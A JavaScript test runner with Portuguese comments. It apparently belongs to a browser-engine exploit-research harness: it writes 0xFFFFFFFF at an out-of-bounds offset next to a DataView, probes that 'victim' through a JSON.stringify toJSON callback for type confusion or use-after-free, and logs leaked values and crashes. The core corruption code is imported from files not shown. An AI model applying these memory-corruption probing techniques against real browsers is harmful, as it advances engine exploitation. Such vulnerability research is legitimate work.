// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualizar a importação para a nova função de teste
import { executeFocusedTestForDataViewVictim } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

async function runDataViewVictimTest() {
    const FNAME_RUNNER = "runDataViewVictimTest";
    logS3(`==== INICIANDO Teste com DataView como Vítima Pós-Corrupção ====`, 'test', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const testDescription = `DataViewVictim_OOB_${toHex(valueForCorruption)}_at_${toHex(criticalOffset)}`;

    logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    
    let result = await executeFocusedTestForDataViewVictim( // Chama a nova função
        testDescription,
        valueForCorruption,
        criticalOffset
    );

    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO (JSON.stringify): ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "error");
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no JSON.stringify.`, "good", FNAME_RUNNER);
        logS3(`      Stringify Result (conteúdo retornado pela toJSON_ProbeDataViewVictim):`, "leak");
        logS3(`      ${JSON.stringify(result.stringifyResult, null, 2)}`, "leak"); // Pretty print

        // Análise adicional do resultado do stringifyResult (que é o objeto retornado pela toJSON)
        if (result.stringifyResult && typeof result.stringifyResult === 'object') {
            const sr = result.stringifyResult;
            if (sr.toJSON_executed === "toJSON_ProbeDataViewVictim") {
                logS3(`      toJSON_ProbeDataViewVictim foi executada.`, "info", FNAME_RUNNER);
                logS3(`      Tipo de 'this': ${sr.this_type}, É DataView?: ${sr.is_dataview}`, "info", FNAME_RUNNER);
                logS3(`      DV Props: byteLength=${sr.dv_byteLength}, byteOffset=${sr.dv_byteOffset}`, "info", FNAME_RUNNER);
                logS3(`      DV Buffer: accessible=${sr.dv_buffer_accessible}, byteLength=${sr.dv_buffer_byteLength}`, "info", FNAME_RUNNER);
                logS3(`      Leitura de 'this.getUint32(0)': ${sr.dv_read_val_at_0 !== "N/A" ? toHex(Number(sr.dv_read_val_at_0)) : sr.dv_read_val_at_0} (Erro: ${sr.dv_read_error || "Nenhum"})`, sr.dv_read_error ? "warn" : "info", FNAME_RUNNER);
                logS3(`      Leitura de new DV(this.buffer).getUint32(0): ${sr.new_dv_from_buffer_read_val !== "N/A" ? toHex(Number(sr.new_dv_from_buffer_read_val)) : sr.new_dv_from_buffer_read_val} (Erro: ${sr.new_dv_from_buffer_error || "Nenhum"})`, sr.new_dv_from_buffer_error ? "warn" : "info", FNAME_RUNNER);
                if(sr.error_in_toJSON){
                    logS3(`      ERRO GERAL DENTRO DA toJSON: ${sr.error_in_toJSON}`, "error", FNAME_RUNNER);
                }
            }
        }
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Teste com DataView como Vítima CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_DataViewVictimTest';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste com DataView como Vítima Pós-Corrupção ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - DataView Victim";
    
    await runDataViewVictimTest();

    logS3(`\n==== Script 3 CONCLUÍDO (Teste com DataView como Vítima) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    } else {
        document.title = "Script 3 Concluído - DataView Victim";
    }
}
